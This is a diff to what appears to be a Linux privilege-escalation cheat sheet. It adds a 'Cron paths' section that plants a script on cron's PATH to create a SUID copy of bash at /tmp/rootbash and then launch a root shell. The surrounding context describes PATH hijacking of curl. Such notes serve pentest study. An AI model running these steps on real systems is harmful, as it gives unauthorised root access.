@@ -86,3 +86,15 @@ Create malicious version of curl in /tmp directory and add /tmp to path $ export
 Execute the original binary e.g /usr/bin/menu <br>
 This happens because path checks left to right every directory specified for the file, new added path directory is first on left
 
+<h2> Cron paths </h2><br>
+cat /etc/crontab <br>
+look at the PATH value <br>
+Create new file in path being called e.g /home/user <br>
+add code<br>
+#!/bin/bash<br>
+<br>
+cp /bin/bash /tmp/rootbash<br>
+chmod +xs /tmp/rootbash<br>
+<br>
+add chmod +x file.sh <br>
+wait for cronjob to run and run /tmp/rootbash -p <br>
